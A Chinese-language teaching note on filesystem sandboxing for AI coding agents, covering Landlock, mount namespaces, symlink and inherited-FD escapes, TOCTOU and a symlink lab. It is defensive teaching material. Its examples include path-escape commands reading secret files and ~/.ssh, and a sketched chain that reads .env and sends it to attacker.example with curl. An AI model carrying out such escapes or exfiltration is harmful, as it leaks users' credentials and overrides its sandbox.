# 第 9 讲：Filesystem Sandbox

## 1. cwd 为什么不等于 Sandbox

设置：

    cwd = /workspace/project

只代表：

> 程序启动后的当前目录。

它不会自动禁止：

    cat ../secret.txt
    cat /home/user/secret.txt

因此：

    cwd != filesystem isolation

## 2. 真正需要的是 Workspace Boundary

例如：

    /workspace/project
        READ
        WRITE
        EXECUTE

其他目录：

    DENY

这才是 AI Coding Agent 真正需要的 Workspace Sandbox。

## 3. symlink 为什么危险

假设：

    project/
      link -> /home/user/.ssh

程序访问：

    project/link/id_rsa

字符串看起来还在 project。

但最终对象已经跳到敏感目录。

因此安全策略必须考虑：

- canonical path；
- symlink；
- mount；
- hardlink；
- relative path；
- already-open file descriptors。

## 4. Linux 怎么做

常见组合：

    Mount Namespace
          ↓
    控制“看到哪些目录”

    Landlock
          ↓
    控制“对这些目录能做什么”

例如：

    /workspace
      READ
      WRITE
      EXECUTE

    /tmp
      READ
      WRITE

    credentials
      DENY

## 5. Landlock 的关键思想

Landlock 是 Linux Kernel 的 LSM sandbox 机制，可以由普通进程给自己增加额外限制。

它是：

> Additional restriction

而不是：

> Grant new privilege

也就是说：

    原本没有权限
       ↓
    Landlock
       ↓
    仍然没有权限

    原本有权限
       ↓
    Landlock
       ↓
    可以进一步限制

## 6. 为什么要限制“操作类型”

不是只有：

    read
    write

还可能有：

    execute
    remove
    create
    truncate
    rename / link
    device ioctl

AI Coding Workspace 通常需要：

    read
    write
    create
    remove

但未必需要：

    device access
    unrestricted namespace creation

## 7. Open FD 是高级问题

假设 Sandbox 前：

    fd = open("/secret.txt")

之后再进入 Sandbox。

如果这个 fd 继续被继承：

    Sandbox
      ↓
    inherited fd
      ↓
    secret.txt

那么路径规则可能已经来不及阻止。

因此 Sandbox Runtime 还要设计：

- inherited FD policy；
- close-on-exec；
- stdin/stdout/stderr；
- inherited sockets。

## 8. 文件系统隔离不能替代网络隔离

即使：

    workspace-only

如果 Agent 可以：

    read .env
      ↓
    curl attacker.example
      ↓
    exfiltrate

仍然有数据外传风险。

所以：

    Filesystem Isolation
           +
    Network Isolation

是现代 Agent Sandbox 的基础组合。

## 9. 实验

目录：

    sandbox-demo/
      workspace/
        hello.txt
      secret.txt

测试：

    cat workspace/hello.txt
    cat secret.txt
    cat workspace/../secret.txt

再创建：

    ln -s ../secret.txt workspace/link

测试：

    cat workspace/link

问题：

> 一个真正的 Sandbox 应该在哪里阻止它？

答案不是“发现 link 就拒绝”，而是应该在 OS policy 层让越界访问失败。

## 10. 面试题

### Q：为什么 cwd 不是 Sandbox？

因为它只设置工作目录，不限制绝对路径、相对路径、symlink 和 inherited FD。

### Q：Landlock 和 chmod 有什么区别？

chmod 是传统文件权限模型；Landlock 是额外的进程级限制层。

## 参考

Linux Landlock:
https://docs.kernel.org/userspace-api/landlock.html


## 11. Landlock 规则不是“自动拒绝一切未列出的行为”

Landlock ruleset 创建时必须明确声明哪些 access rights 由该 ruleset 接管（`handled_access_fs`）。只有被标记为 handled 的访问类型，才会按照 Landlock 规则被拒绝或允许；没有被声明为 handled 的类型仍按其他传统权限检查处理。

因此生产策略要：

1. 查询运行中 Kernel 的 Landlock ABI；
2. 按 ABI 能力构造 handled 权限；
3. 对每个允许访问的目录授予明确的权限；
4. 对不能覆盖的权限使用其他机制补齐；
5. 如果目标平台无法强制执行关键策略，应拒绝启动或明确降级，不要悄悄当作安全成功。

## 12. 已打开 FD 与路径授权不是同一个问题

Landlock 对通过路径打开和通过已有 FD 访问的对象有细致规则；在进入 Sandbox 前已经打开的文件描述符可能保留原有访问能力，或在后续操作时受到不同的检查。

所以 Runtime 应在进入 Sandbox 前：

- 关闭不需要的文件描述符；
- 对必须保留的 stdin/stdout/stderr 做明确设计；
- 不要无条件继承 SSH Agent、Docker Socket、数据库 socket 等 FD；
- 使用 close-on-exec，并审查 FD passing / Unix socket；
- 不要把“路径策略已配置”理解成“进程手上没有任何越界能力”。

## 13. Hardlink、REFER 与 TOCTOU

路径规范化和 `realpath()` 检查不能单独防住所有文件系统竞态。文件可能在检查后、打开前被替换；硬链接也意味着不同路径可能指向同一个 inode。

在 Linux 上应结合 Landlock 的 `REFER` 权限、适当的路径解析约束（例如 `openat2` 的 resolve flags）和基于 FD 的操作设计。不要只用字符串前缀判断路径是否位于 workspace。
